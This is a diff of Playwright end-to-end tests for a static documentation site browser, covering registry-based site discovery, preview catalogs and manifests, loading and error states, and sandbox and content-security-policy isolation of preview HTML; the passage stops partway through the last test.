@@ -44,13 +44,23 @@ function buildPaletteScoringProfile(artifacts: Array<{ title: string; path: stri
   }
 }
 
-test('nginx index listing discovers sites and opens a site home', async ({ page }) => {
-  const listing = await page.request.get('/_indexes/')
-  expect(listing.ok()).toBeTruthy()
-  const directoryListing = await listing.text()
-  expect(directoryListing).toContain('sre/')
-  expect(directoryListing).toContain('frontend/')
-  expect(directoryListing).toContain('showcase/')
+test('static sites catalog discovers sites and opens a site home without directory listing', async ({ page }) => {
+  const discoveryRequests: string[] = []
+  page.on('request', (request) => {
+    const pathname = new URL(request.url()).pathname
+    if (pathname === '/_indexes/' || pathname === '/_indexes/sites.json') discoveryRequests.push(pathname)
+  })
+  const registryResponse = await page.request.get('/_indexes/sites.json')
+  expect(registryResponse.ok()).toBeTruthy()
+  const registry = await registryResponse.json()
+  expect(registry).toMatchObject({
+    schemaVersion: 1,
+    sites: [
+      { id: 'frontend', name: 'Frontend' },
+      { id: 'showcase', name: 'HTML Showcase' },
+      { id: 'sre', name: 'SRE' },
+    ],
+  })
 
   const metadataResponse = await page.request.get('/_indexes/sre/meta.json')
   expect(metadataResponse.ok()).toBeTruthy()
@@ -61,6 +71,8 @@ test('nginx index listing discovers sites and opens a site home', async ({ page 
   })
 
   await page.goto('/')
+  await expect.poll(() => discoveryRequests.includes('/_indexes/sites.json')).toBeTruthy()
+  expect(discoveryRequests).not.toContain('/_indexes/')
   await expect(page.getByRole('heading', { name: 'Choose a site' })).toBeVisible()
   await expect(page.getByRole('button', { name: 'Search sites' })).toBeVisible()
   await expect(page.getByRole('button', { name: /SRE/ })).toBeVisible()
@@ -170,7 +182,8 @@ test('the SRE index date is labeled as generation time and follows artifact upda
   const indexDate = page.locator('.sidebar-panel .index-date')
   await expect(indexDate).toContainText('Index generated')
   await expect(indexDate.locator('time')).toHaveAttribute('datetime', sreIndex.generatedAt)
-  await expect(indexDate).toHaveText('Index generated Sep 25')
+  const generatedDate = new Date(sreIndex.generatedAt).toLocaleDateString('en-US', { month: 'short', day: 'numeric', timeZone: 'UTC' })
+  await expect(indexDate).toHaveText(`Index generated ${generatedDate}`)
 })
 
 test('the root command palette searches sites and opens the selected site', async ({ page }) => {
@@ -203,6 +216,115 @@ test('the root command palette searches sites and opens the selected site', asyn
   await expect(palette).toBeHidden()
   await expect(page).toHaveURL(/\/frontend$/)
   await expect(page.getByRole('heading', { name: 'Frontend', exact: true })).toBeVisible()
+})
+
+test('registered discovery honors sites.json, hides unregistered storage, and loads only the active full index', async ({ page }) => {
+  const indexRequests: string[] = []
+  const metadataRequests: string[] = []
+  const directoryRequests: string[] = []
+  page.on('request', (request) => {
+    const pathname = new URL(request.url()).pathname
+    if (/^\/_indexes\/[^/]+\/index\.json$/u.test(pathname)) indexRequests.push(pathname)
+    if (/^\/_indexes\/[^/]+\/meta\.json$/u.test(pathname)) metadataRequests.push(pathname)
+    if (pathname === '/_indexes/') directoryRequests.push(pathname)
+  })
+  await page.route('**/_indexes/sites.json', (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify({
+      schemaVersion: 1,
+      sites: [
+        { id: 'frontend', name: 'Frontend registered', repository: 'acme/frontend', sourcePath: 'sites/frontend' },
+        { id: 'sre', name: 'SRE registered', repository: 'acme/sre', sourcePath: 'sites/sre' },
+      ],
+    }),
+  }))
+  await page.route('**/_indexes/frontend/meta.json', (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify({
+      schemaVersion: 1,
+      site: { id: 'frontend', title: 'Frontend metadata' },
+      generatedAt: '2026-09-25T00:00:00Z',
+      artifactCount: 1,
+      artifactIndexUrl: '/_indexes/frontend/index.json',
+    }),
+  }))
+  await page.route('**/_indexes/sre/meta.json', (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify({
+      schemaVersion: 1,
+      site: { id: 'sre', title: 'SRE metadata' },
+      generatedAt: '2026-09-25T00:00:00Z',
+      artifactCount: 6,
+      artifactIndexUrl: '/_indexes/sre/index.json',
+    }),
+  }))
+
+  await page.goto('/')
+  await expect(page.getByRole('heading', { name: 'Choose a site' })).toBeVisible()
+  await expect(page.getByRole('button', { name: /Frontend registered/ })).toBeVisible()
+  await expect(page.getByRole('button', { name: /SRE registered/ })).toBeVisible()
+  await expect(page.getByRole('button', { name: /HTML Showcase/ })).toHaveCount(0)
+  expect(metadataRequests.sort()).toEqual(['/_indexes/frontend/meta.json', '/_indexes/sre/meta.json'])
+  expect(indexRequests).toEqual([])
+  expect(directoryRequests).toEqual([])
+
+  await page.getByRole('button', { name: /SRE registered/ }).click()
+  await expect(page).toHaveURL(/\/sre$/u)
+  await expect(page.getByRole('heading', { name: 'SRE registered', exact: true })).toBeVisible()
+  await expect.poll(() => [...indexRequests]).toEqual(['/_indexes/sre/index.json'])
+  expect(indexRequests).not.toContain('/_indexes/frontend/index.json')
+  expect(indexRequests).not.toContain('/_indexes/orphaned/index.json')
+})
+
+test('registered discovery shows empty and malformed registries and refreshes renamed sites after reload', async ({ page }) => {
+  let registryState: 'empty' | 'malformed' | 'first' | 'renamed' = 'empty'
+  await page.route('**/_indexes/sites.json', (route) => {
+    if (registryState === 'empty') {
+      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ schemaVersion: 1, sites: [] }) })
+    }
+    if (registryState === 'malformed') {
+      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ schemaVersion: 1, sites: [{ id: 'sre' }] }) })
+    }
+    const name = registryState === 'first' ? 'SRE first name' : 'SRE renamed'
+    return route.fulfill({
+      status: 200,
+      contentType: 'application/json',
+      body: JSON.stringify({
+        schemaVersion: 1,
+        sites: [{ id: 'sre', name, repository: 'acme/sre', sourcePath: 'sites/sre' }],
+      }),
+    })
+  })
+  await page.route('**/_indexes/sre/meta.json', (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify({
+      schemaVersion: 1,
+      site: { id: 'sre', title: 'SRE metadata' },
+      generatedAt: '2026-09-25T00:00:00Z',
+      artifactCount: 6,
+      artifactIndexUrl: '/_indexes/sre/index.json',
+    }),
+  }))
+
+  await page.goto('/')
+  await expect(page.getByText('No site indexes were found.')).toBeVisible()
+
+  registryState = 'malformed'
+  await page.reload()
+  await expect(page.getByRole('heading', { name: 'Unable to load this site' })).toBeVisible()
+
+  registryState = 'first'
+  await page.reload()
+  await expect(page.getByRole('button', { name: /SRE first name/ })).toBeVisible()
+
+  registryState = 'renamed'
+  await page.reload()
+  await expect(page.getByRole('button', { name: /SRE renamed/ })).toBeVisible()
+  await expect(page.getByRole('button', { name: /SRE first name/ })).toHaveCount(0)
 })
 
 test('site discovery loads lightweight metadata for all sites but detailed indexes on demand', async ({ page }) => {
@@ -262,34 +384,15 @@ test('site switcher has no default destination, then selects matching sites by q
   await expect(page.getByRole('heading', { name: 'Frontend', exact: true })).toBeVisible()
 })
 
-test('site discovery cannot change the switcher destination under keyboard selection', async ({ page }) => {
-  let finishDiscovery = () => {}
-  let discoveryStarted = () => {}
-  const discoveryGate = new Promise<void>((resolve) => { finishDiscovery = resolve })
-  const discoveryStartedGate = new Promise<void>((resolve) => { discoveryStarted = resolve })
-  await page.route('**/_indexes/', async (route) => {
-    discoveryStarted()
-    await discoveryGate
-    await route.continue()
+test('fixture discovery never falls back to nginx directory listing', async ({ page }) => {
+  const directoryRequests: string[] = []
+  page.on('request', (request) => {
+    if (new URL(request.url()).pathname === '/_indexes/') directoryRequests.push(request.url())
   })
-
   await page.goto('/sre')
   await expect(page.getByRole('heading', { name: 'SRE', exact: true })).toBeVisible()
-  await discoveryStartedGate
-
-  await page.getByRole('button', { name: 'Switch site. Current site: SRE' }).click()
-  const palette = page.getByRole('dialog', { name: 'Command palette' })
-  const search = palette.getByRole('textbox', { name: 'Search artifacts, sites, commands, and headings' })
-  await expect(palette.getByRole('option')).toHaveCount(1)
-  await search.press('ArrowDown')
-  await expect(palette.getByRole('option', { selected: true })).toHaveCount(1)
-
-  finishDiscovery()
-  await expect(palette.getByRole('option')).toHaveCount(3)
-  await expect(palette.getByRole('option', { selected: true })).toHaveCount(0)
-  await search.press('Enter')
-  await expect(palette).toBeVisible()
-  await expect(page).toHaveURL(/\/sre$/)
+  await expect(page.getByRole('button', { name: 'Switch site. Current site: SRE' })).toBeVisible()
+  expect(directoryRequests).toEqual([])
 })
 
 test('small sites avoid redundant recent sections while larger sites keep them', async ({ page }) => {
@@ -575,6 +678,9 @@ test('HTML heading navigation keeps the URL and iframe section in sync with one 
   await page.goto('/showcase/editorial/field-notes/index.html')
 
   const artifact = page.frameLocator('iframe[title="Designing for resilience"]')
+  const iframeHash = () => page.locator('iframe[title="Designing for resilience"]').evaluate((frame) => {
+    return (frame as HTMLIFrameElement).contentWindow?.location.hash ?? null
+  })
   const practiceHeading = artifact.getByRole('heading', { name: 'Practice over prediction' })
   await expect(artifact.getByRole('heading', { name: 'Designing for resilience' })).toBeVisible()
   await page.getByRole('button', { name: 'Contents', exact: true }).click()
@@ -582,22 +688,22 @@ test('HTML heading navigation keeps the URL and iframe section in sync with one 
     .getByRole('button', { name: 'Practice over prediction' }).click()
 
   await expect(page).toHaveURL(/#practice$/)
-  await expect.poll(() => artifact.locator('body').evaluate((body) => body.ownerDocument.defaultView?.location.hash)).toBe('#practice')
+  await expect.poll(iframeHash).toBe('#practice')
   await expect(practiceHeading).toBeInViewport()
 
   await page.goBack()
   await expect(page).toHaveURL(/\/showcase\/editorial\/field-notes\/index\.html$/)
-  await expect.poll(() => artifact.locator('body').evaluate((body) => body.ownerDocument.defaultView?.location.hash)).toBe('')
+  await expect.poll(iframeHash).toBe('')
   await expect(artifact.getByRole('heading', { name: 'Designing for resilience' })).toBeInViewport()
 
   await page.goForward()
   await expect(page).toHaveURL(/#practice$/)
-  await expect.poll(() => artifact.locator('body').evaluate((body) => body.ownerDocument.defaultView?.location.hash)).toBe('#practice')
+  await expect.poll(iframeHash).toBe('#practice')
   await expect(practiceHeading).toBeInViewport()
 
   await page.reload()
   await expect(page).toHaveURL(/#practice$/)
-  await expect.poll(() => artifact.locator('body').evaluate((body) => body.ownerDocument.defaultView?.location.hash)).toBe('#practice')
+  await expect.poll(iframeHash).toBe('#practice')
   await expect(practiceHeading).toBeInViewport()
 })
 
@@ -1535,6 +1641,9 @@ test('site home search and navigation filter stay distinct and navigation clears
   const palette = page.getByRole('dialog', { name: 'Command palette' })
   const paletteSearch = palette.getByRole('textbox', { name: 'Search artifacts, sites, commands, and headings' })
   await paletteSearch.fill('Checkout latency incident review')
+  const checkoutResult = palette.getByRole('option', { name: /Checkout latency incident review/ })
+  await expect(checkoutResult).toBeVisible()
+  await expect(checkoutResult).toHaveAttribute('aria-selected', 'true')
   await paletteSearch.press('Enter')
   await expect(page).toHaveURL(/\/sre\/incidents\/checkout-latency\/index\.html$/)
   await expect(navigationFilter).toHaveValue('')
@@ -1589,4 +1698,589 @@ test('a failed known-site index load stays distinct from an unknown site', async
   await expect(page.getByRole('alert')).toHaveText('The site could not be loaded (HTTP 503). Please try again in a moment.')
   await expect(page.getByRole('heading', { name: 'Site not found' })).toHaveCount(0)
   await expect(page.locator('.status-content')).not.toContainText('/_indexes/')
+})
+
+const previewHeadSha = '0123456789abcdef0123456789abcdef01234567'
+
+test('published preview documents stay out of production browsing and the site-home link opens previews', async ({ page }) => {
+  const previewOnlyTitle = 'Preview-only rollout note'
+  const previewOnlyDocument = { path: 'guides/preview-only.md', title: previewOnlyTitle, format: 'markdown' }
+  const previewOnlyGroup = {
+    id: 'pr:701',
+    kind: 'pull-request',
+    headSha: previewHeadSha,
+    prUrl: 'https://github.com/acme/showcase/pull/701',
+    updatedAt: '2026-09-27T00:00:00Z',
+    documents: [previewOnlyDocument],
+  }
+  const previewOnlyManifest = {
+    schemaVersion: 1,
+    site: 'showcase',
+    headSha: previewHeadSha,
+    defaultHeadSha: '1111111111111111111111111111111111111111',
+    mergeBaseSha: '2222222222222222222222222222222222222222',
+    createdAt: '2026-09-27T00:00:00Z',
+    bundleDigest: `sha256:${'0'.repeat(64)}`,
+    files: [{ path: previewOnlyDocument.path, sha256: 'a'.repeat(64), contentType: 'text/markdown; charset=utf-8' }],
+    documents: [previewOnlyDocument],
+  }
+  const previewRequests: string[] = []
+  page.on('request', (request) => {
+    const pathname = new URL(request.url()).pathname
+    if (pathname.includes('/_previews/')) previewRequests.push(pathname)
+  })
+  await page.route('**/_previews/showcase/catalog.json', (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify({ schemaVersion: 1, site: 'showcase', groups: [previewOnlyGroup] }),
+  }))
+  await page.route(`**/_previews/showcase/revisions/${previewHeadSha}/manifest.json`, (route) => route.fulfill({
+    status: 200,
+    contentType: 'application/json',
+    body: JSON.stringify(previewOnlyManifest),
+  }))
+
+  await page.goto('/showcase')
+  await expect(page.getByRole('heading', { name: 'HTML Showcase', exact: true })).toBeVisible()
+  const recent = page.locator('.site-home .artifact-list-section[aria-label="Recently updated"]')
+  const browse = page.locator('.site-home .browse-section')
+  await expect(recent).toBeVisible()
+  await expect(browse).toBeVisible()
+  await expect(recent).not.toContainText(previewOnlyTitle)
+  await expect(browse).not.toContainText(previewOnlyTitle)
+  expect(previewRequests).toEqual([])
+
+  const siteSearch = page.getByRole('searchbox', { name: 'Search artifacts in HTML Showcase' })
+  await siteSearch.fill(previewOnlyTitle)
+  await expect(page.getByText(/Nothing in this site matches your search/)).toBeVisible()
+  await expect(page.locator('.site-home .tree-artifact')).toHaveCount(0)
+  await siteSearch.fill('')
+
+  await page.getByRole('button', { name: 'View previews' }).click()
+  await expect(page).toHaveURL('/showcase/_previews')
+  await expect(page.getByRole('region', { name: 'Preview pr:701' })).toBeVisible()
+  await expect(page.getByRole('link', { name: previewOnlyTitle })).toBeVisible()
+  expect(previewRequests).toContain('/_previews/showcase/catalog.json')
+  expect(previewRequests).toContain(`/_previews/showcase/revisions/${previewHeadSha}/manifest.json`)
+
+  await page.getByRole('link', { name: '← showcase' }).click()
+  await expect(page).toHaveURL('/showcase')
+  await expect(recent).toBeVisible()
+  await expect(browse).toBeVisible()
+  await expect(recent).not.toContainText(previewOnlyTitle)
+  await expect(browse).not.toContainText(previewOnlyTitle)
+
+  previewRequests.length = 0
+  await page.getByRole('button', { name: 'Search pages in HTML Showcase' }).click()
+  const palette = page.getByRole('dialog', { name: 'Command palette' })
+  const paletteSearch = palette.getByRole('textbox', { name: 'Search artifacts, sites, commands, and headings' })
+  await paletteSearch.fill(previewOnlyTitle)
+  await expect(palette.getByRole('option')).toHaveCount(0)
+  await expect(palette.getByText('Nothing matches. Try > for commands, @ for sites, or # for headings.')).toBeVisible()
+  expect(previewRequests).toEqual([])
+})
+
+test('preview list validates candidate manifests before presenting entries', async ({ page }) => {
+  let manifestState: 'mismatched' | 'malformed' = 'mismatched'
+  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/manifest.json`, async (route) => {
+    const response = await route.fetch()
+    const manifest = await response.json()
+    if (manifestState === 'mismatched') {
+      manifest.documents = manifest.documents.slice(0, 1)
+      await route.fulfill({ response, body: JSON.stringify(manifest) })
+      return
+    }
+    await route.fulfill({ response, body: JSON.stringify({ ...manifest, schemaVersion: 99 }) })
+  })
+
+  await page.goto('/sre/_previews')
+  await expect(page.getByRole('alert')).toHaveText('Some preview catalog records did not match their revision manifests.')
+  await expect(page.getByRole('region', { name: 'Preview pr:42' })).toHaveCount(0)
+  await expect(page.getByRole('region', { name: 'Preview pr:43' })).toHaveCount(0)
+  await expect(page.getByRole('region', { name: `Preview head:${previewHeadSha}` })).toHaveCount(0)
+  await expect(page.getByRole('status').filter({ hasText: 'There are no available previews for this site.' })).toBeVisible()
+
+  manifestState = 'malformed'
+  await page.reload()
+  await expect(page.getByRole('alert')).toHaveText('Some preview catalog records did not match their revision manifests.')
+  await expect(page.getByRole('region', { name: 'Preview pr:42' })).toHaveCount(0)
+  await expect(page.getByRole('status').filter({ hasText: 'There are no available previews for this site.' })).toBeVisible()
+
+  await page.goto('/sre')
+  await page.getByRole('button', { name: 'Search pages in SRE' }).click()
+  const palette = page.getByRole('dialog', { name: 'Command palette' })
+  await palette.getByRole('button', { name: 'Previews' }).click()
+  await expect(palette.getByRole('status').filter({ hasText: 'Some preview records did not match their revision manifests.' })).toBeVisible()
+  await expect(palette.getByRole('option')).toHaveCount(0)
+  await expect(palette.getByText('There are no available previews for this site.')).toBeVisible()
+})
+
+test('preview list distinguishes missing groups, empty catalogs, missing catalogs, and catalog errors', async ({ page }) => {
+  let catalogState: 'empty' | 'missing' | 'error' = 'empty'
+  await page.route('**/_previews/sre/catalog.json', (route) => {
+    if (catalogState === 'missing') return route.fulfill({ status: 404, body: 'not found' })
+    if (catalogState === 'error') return route.fulfill({ status: 503, body: 'temporarily unavailable' })
+    return route.fulfill({
+      status: 200,
+      contentType: 'application/json',
+      body: JSON.stringify({ schemaVersion: 1, site: 'sre', groups: [] }),
+    })
+  })
+
+  await page.goto('/sre/_previews?group=pr%3A404')
+  await expect(page.getByRole('status')).toHaveText('This preview is no longer listed.')
+
+  await page.goto('/sre/_previews')
+  await expect(page.getByRole('status')).toHaveText('There are no available previews for this site.')
+
+  catalogState = 'missing'
+  await page.reload()
+  await expect(page.getByRole('status')).toHaveText('There are no available previews for this site.')
+
+  catalogState = 'error'
+  await page.reload()
+  await expect(page.getByRole('alert')).toHaveText('The preview list could not be loaded.')
+  await page.getByRole('link', { name: '← sre' }).click()
+  await expect(page).toHaveURL('/sre')
+  await expect(page.getByRole('heading', { name: 'SRE', exact: true })).toBeVisible()
+})
+
+test('preview list loading does not block returning to the site', async ({ page }) => {
+  let releaseCatalog!: () => void
+  let signalCatalogStarted!: () => void
+  const catalogGate = new Promise<void>((resolve) => { releaseCatalog = resolve })
+  const catalogStarted = new Promise<void>((resolve) => { signalCatalogStarted = resolve })
+  const catalogResponse = page.waitForResponse((response) => (
+    new URL(response.url()).pathname === '/_previews/sre/catalog.json'
+  ))
+  await page.route('**/_previews/sre/catalog.json', async (route) => {
+    signalCatalogStarted()
+    await catalogGate
+    await route.fulfill({ status: 503, body: 'temporarily unavailable' })
+  })
+
+  await page.goto('/sre')
+  await page.getByRole('button', { name: 'View previews' }).click()
+  await catalogStarted
+  await expect(page.getByRole('status')).toHaveText('Loading previews…')
+  try {
+    await page.getByRole('link', { name: '← sre' }).click()
+    await expect(page).toHaveURL('/sre')
+    await expect(page.getByRole('heading', { name: 'SRE', exact: true })).toBeVisible()
+  } finally {
+    releaseCatalog()
+  }
+  await catalogResponse
+})
+
+test('preview palette loading, empty, and error states leave normal site navigation available', async ({ page }) => {
+  let catalogState: 'missing' | 'error' | 'delayed' = 'missing'
+  let releaseCatalog!: () => void
+  let signalDelayedCatalog!: () => void
+  const catalogGate = new Promise<void>((resolve) => { releaseCatalog = resolve })
+  const delayedCatalogStarted = new Promise<void>((resolve) => { signalDelayedCatalog = resolve })
+  await page.route('**/_previews/sre/catalog.json', async (route) => {
+    if (catalogState === 'missing') return route.fulfill({ status: 404, body: 'not found' })
+    if (catalogState === 'error') return route.fulfill({ status: 503, body: 'temporarily unavailable' })
+    signalDelayedCatalog()
+    await catalogGate
+    return route.fulfill({ status: 503, body: 'temporarily unavailable' })
+  })
+
+  await page.goto('/sre')
+  await page.getByRole('button', { name: 'Search pages in SRE' }).click()
+  const palette = page.getByRole('dialog', { name: 'Command palette' })
+  const allPages = palette.getByRole('button', { name: 'All pages' })
+  const previewTab = palette.getByRole('button', { name: 'Previews' })
+  await previewTab.click()
+  await expect(palette.getByText('There are no available previews for this site.')).toBeVisible()
+
+  catalogState = 'error'
+  await allPages.click()
+  await previewTab.click()
+  await expect(palette.getByRole('alert')).toHaveText('The preview list could not be loaded.')
+  await allPages.click()
+  await expect(palette.getByRole('option', { name: /Platform topology/ })).toBeVisible()
+
+  catalogState = 'delayed'
+  const delayedCatalogResponse = page.waitForResponse((response) => (
+    new URL(response.url()).pathname === '/_previews/sre/catalog.json' && response.status() === 503
+  ))
+  await previewTab.click()
+  await delayedCatalogStarted
+  await expect(palette.getByRole('status')).toHaveText('Loading previews…')
+  try {
+    await allPages.click()
+    await expect(palette.getByRole('option', { name: /Platform topology/ })).toBeVisible()
+    await page.keyboard.press('Escape')
+    await expect(palette).toBeHidden()
+    await expect(page.getByRole('heading', { name: 'SRE', exact: true })).toBeVisible()
+  } finally {
+    releaseCatalog()
+  }
+  await delayedCatalogResponse
+})
+
+test('site previews filter missing revisions and keep PR and manual groups distinct', async ({ page }) => {
+  const previewCatalogRequests: string[] = []
+  page.on('request', (request) => {
+    const pathname = new URL(request.url()).pathname
+    if (pathname.includes('/_previews/') && pathname.endsWith('/catalog.json')) previewCatalogRequests.push(pathname)
+  })
+
+  await page.goto('/sre/_previews')
+  await expect(page.getByRole('heading', { name: 'Previews', exact: true })).toBeVisible()
+  await expect(page.getByRole('region', { name: 'Preview pr:42' })).toBeVisible()
+  await expect(page.getByRole('region', { name: 'Preview pr:43' })).toBeVisible()
+  await expect(page.getByRole('region', { name: `Preview head:${previewHeadSha}` })).toBeVisible()
+  await expect(page.getByRole('region', { name: 'Preview pr:99' })).toHaveCount(0)
+  await expect.poll(() => [...previewCatalogRequests]).toEqual(['/_previews/sre/catalog.json'])
+
+  const markdownLink = page.getByRole('link', { name: /Local preview guide/ }).first()
+  await expect(markdownLink).toHaveAttribute('href', new RegExp(`/sre/_previews/${previewHeadSha}/guides/preview-guide\\.md\\?group=pr%3A42$`))
+  await markdownLink.click()
+  await expect(page).toHaveURL(new RegExp(`/sre/_previews/${previewHeadSha}/guides/preview-guide\\.md\\?group=pr%3A42$`))
+  await expect(page.getByRole('link', { name: 'Return to PR #42 ↗' })).toHaveAttribute('href', 'https://github.com/acme/sre-docs/pull/42')
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Local preview guide')
+  await expect(page.getByRole('img', { name: 'Preview mark' })).toBeVisible()
+  await expect(page.getByRole('link', { name: 'Open the published latency retrospective' })).toHaveAttribute('href', '/sre/reports/latency-retrospective.md')
+
+  await page.goto('/sre/_previews')
+  const encodedDocument = page.getByRole('region', { name: 'Preview pr:42' })
+    .getByRole('link', { name: 'Encoded preview route' })
+  await expect(encodedDocument).toHaveAttribute('href', `/sre/_previews/${previewHeadSha}/guides/review%20r%C3%A9sum%C3%A9%20%23%25%20%2B%3F.md?group=pr%3A42`)
+  await encodedDocument.click()
+  await expect.poll(() => {
+    const url = new URL(page.url())
+    return `${url.pathname}${url.search}`
+  }).toBe(`/sre/_previews/${previewHeadSha}/guides/review%20r%C3%A9sum%C3%A9%20%23%25%20%2B%3F.md?group=pr%3A42`)
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Encoded preview route')
+  await page.reload()
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Encoded preview route')
+
+  await page.goto('/sre/_previews?group=pr%3A43')
+  await expect(page.getByRole('region', { name: 'Preview pr:43' })).toBeVisible()
+  await expect(page.getByRole('region', { name: 'Preview pr:42' })).toHaveCount(0)
+  await page.getByRole('region', { name: 'Preview pr:43' }).getByRole('link', { name: /Local preview guide/ }).click()
+  await expect(page.getByRole('link', { name: 'Return to PR #43 ↗' })).toHaveAttribute('href', 'https://github.com/acme/sre-docs/pull/43')
+
+  await page.goto('/sre/_previews')
+  await page.getByRole('region', { name: `Preview head:${previewHeadSha}` })
+    .getByRole('link', { name: /Local preview guide/ }).click()
+  await expect(page).toHaveURL(new RegExp(`/sre/_previews/${previewHeadSha}/guides/preview-guide\\.md\\?group=head%3A${previewHeadSha}$`))
+  await expect(page.getByRole('link', { name: /Return to PR/ })).toHaveCount(0)
+})
+
+test('the in-site palette has a lazy Previews tab scoped to the active site', async ({ page }) => {
+  const previewRequests: string[] = []
+  page.on('request', (request) => {
+    const pathname = new URL(request.url()).pathname
+    if (pathname.includes('/_previews/')) previewRequests.push(pathname)
+  })
+
+  await page.goto('/sre')
+  await page.getByRole('button', { name: 'Search pages in SRE' }).click()
+  const palette = page.getByRole('dialog', { name: 'Command palette' })
+  await expect(palette).toBeVisible()
+  expect(previewRequests).toEqual([])
+  await palette.getByRole('button', { name: 'Previews' }).click()
+  await expect(palette.getByRole('option', { name: /Local preview guide/ }).first()).toBeVisible()
+  await expect.poll(() => previewRequests.some((pathname) => pathname === '/_previews/sre/catalog.json')).toBe(true)
+  expect(previewRequests.every((pathname) => pathname.startsWith('/_previews/sre/'))).toBeTruthy()
+  expect(previewRequests).not.toContain('/_previews/frontend/catalog.json')
+  await expect(palette.getByText('PR #42', { exact: true })).toBeVisible()
+  await palette.getByRole('option', { name: /Local preview guide/ }).first().click()
+  await expect(page).toHaveURL(new RegExp(`/sre/_previews/${previewHeadSha}/guides/preview-guide\\.md\\?group=pr%3A42$`))
+})
+
+test('preview PR context disappears when its catalog group advances or is removed', async ({ page }) => {
+  let catalogState: 'current' | 'advanced' | 'removed' = 'current'
+  await page.route('**/_previews/sre/catalog.json', async (route) => {
+    const response = await route.fetch()
+    const catalog = await response.json()
+    if (catalogState === 'advanced') {
+      catalog.groups = catalog.groups.map((group: { id: string; headSha: string }) => (
+        group.id === 'pr:42' ? { ...group, headSha: 'ffffffffffffffffffffffffffffffffffffffff' } : group
+      ))
+    } else if (catalogState === 'removed') {
+      catalog.groups = catalog.groups.filter((group: { id: string }) => group.id !== 'pr:42')
+    }
+    await route.fulfill({ response, body: JSON.stringify(catalog) })
+  })
+
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview-guide.md?group=pr%3A42`)
+  await expect(page.getByRole('link', { name: 'Return to PR #42 ↗' })).toBeVisible()
+  catalogState = 'advanced'
+  await page.reload()
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Local preview guide')
+  await expect(page.getByRole('link', { name: /Return to PR/ })).toHaveCount(0)
+
+  catalogState = 'removed'
+  await page.reload()
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Local preview guide')
+  await expect(page.getByRole('link', { name: /Return to PR/ })).toHaveCount(0)
+
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview-guide.md?group=pr%3A43`)
+  await expect(page.getByRole('link', { name: 'Return to PR #43 ↗' })).toHaveAttribute('href', 'https://github.com/acme/sre-docs/pull/43')
+})
+
+test('preview HTML keeps changed-document navigation in the preview and unchanged documents in production', async ({ page }) => {
+  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, async (route) => {
+    const response = await route.fetch()
+    const source = await response.text()
+    const extraLinks = [
+      '<p><a href="preview-guide.md?tab=summary#local-preview-guide">Open the changed Markdown document with query and fragment</a></p>',
+      '<p><a href="https://docs.example.test/guide?mode=full#overview">Open external HTTPS documentation</a></p>',
+      '<script>const runtimeName = ["preview", "runtime"].join("-") + ".json"; fetch("./" + runtimeName).then(() => { document.body.dataset.runtimeResource = "loaded"; }).catch(() => { document.body.dataset.runtimeResource = "blocked"; });</script>',
+    ].join('')
+    await route.fulfill({ response, body: source.replace('</main>', `${extraLinks}</main>`) })
+  })
+  await page.route('https://docs.example.test/guide?mode=full', (route) => route.fulfill({
+    status: 200,
+    contentType: 'text/html',
+    body: '<!doctype html><html><body><h1>External guide</h1></body></html>',
+  }))
+  const isolatedDocumentResponse = page.waitForResponse((response) => {
+    const url = new URL(response.url())
+    return url.hostname === 'preview.localhost' && url.pathname.endsWith('/guides/preview.html')
+  })
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+  await expect(page.getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
+  const frame = page.frameLocator('iframe[title="Local preview HTML"]')
+  const frameElement = page.locator('iframe[title="Local preview HTML"]')
+  const frameSrc = await frameElement.getAttribute('src')
+  expect(new URL(frameSrc!, page.url()).hostname).toBe('preview.localhost')
+  await expect(frameElement).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin')
+  const isolatedResponse = await isolatedDocumentResponse
+  const isolatedCsp = isolatedResponse.headers()['content-security-policy']
+  expect(isolatedCsp).toContain("connect-src 'none'")
+  expect(isolatedCsp).toContain('sandbox allow-scripts allow-same-origin')
+  expect(isolatedCsp).toContain('frame-ancestors http://localhost:* http://127.0.0.1:*')
+  await expect(frame.getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
+  await expect.poll(() => frame.locator('body').evaluate(() => window.location.origin)).toBe(new URL(frameSrc!, page.url()).origin)
+  await expect(frame.getByRole('img', { name: 'Blue preview mark' })).toBeVisible()
+  await expect.poll(() => frame.locator('body').evaluate(async () => {
+    await document.fonts.ready
+    return document.fonts.check('16px PreviewFixture')
+  })).toBeTruthy()
+  await expect.poll(() => frame.locator('body').getAttribute('data-runtime-resource')).toBe('blocked')
+  await expect(page.getByRole('link', { name: 'Return to PR #42 ↗' })).toBeVisible()
+
+  await expect.poll(() => frame.locator('html').getAttribute('data-preview-fixture')).toBe('loaded')
+  const parentAccess = await frame.locator('body').evaluate(() => {
+    try {
+      void window.parent.document
+      return 'accessible'
+    } catch {
+      return 'blocked'
+    }
+  })
+  expect(parentAccess).toBe('blocked')
+
+  await frame.getByRole('link', { name: 'Open the changed Markdown document with query and fragment' }).click()
+  await expect(page).toHaveURL(`/sre/_previews/${previewHeadSha}/guides/preview-guide.md?group=pr%3A42&tab=summary#local-preview-guide`)
+  await expect(page.getByRole('link', { name: 'Return to PR #42 ↗' })).toBeVisible()
+
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+  const externalFrame = page.frameLocator('iframe[title="Local preview HTML"]')
+  await externalFrame.getByRole('link', { name: 'Open external HTTPS documentation' }).click()
